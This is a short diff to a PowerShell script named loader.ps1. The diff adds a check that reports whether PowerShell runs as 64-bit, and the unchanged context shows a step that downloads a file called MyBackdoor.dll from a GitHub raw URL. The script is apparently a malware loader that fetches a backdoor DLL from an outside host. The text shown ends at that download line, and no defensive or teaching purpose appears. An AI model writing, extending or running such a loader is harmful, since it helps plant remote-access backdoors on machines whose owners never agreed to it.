@@ -1,4 +1,9 @@
 # loader.ps1
+if ([Environment]::Is64BitProcess) {
+    Write-Host "[*] Running in 64-bit PowerShell"
+} else {
+    Write-Host "[!] Running in 32-bit PowerShell"
+}
 
 # 1) Download the DLL bytes
 $payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
